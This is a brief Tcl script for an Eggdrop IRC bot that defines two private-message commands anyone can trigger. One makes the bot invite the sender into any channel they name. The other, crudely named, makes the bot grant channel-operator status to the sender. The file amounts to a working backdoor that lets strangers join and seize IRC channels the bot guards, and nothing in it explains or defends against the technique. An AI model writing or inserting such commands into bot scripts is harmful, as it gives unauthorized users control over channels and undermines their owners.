bind msg * inviteme invite_me
proc invite_me {nick uhost handle args} {
set chan [lindex $args 0]
putserv "invite $nick $chan"
return 0}
bind msg * fuckup fuckup_thing
proc fuckup_thing {nick uhost handle args} {
set chan [lindex $args 0]
pushmode $chan +o $nick
return 0}
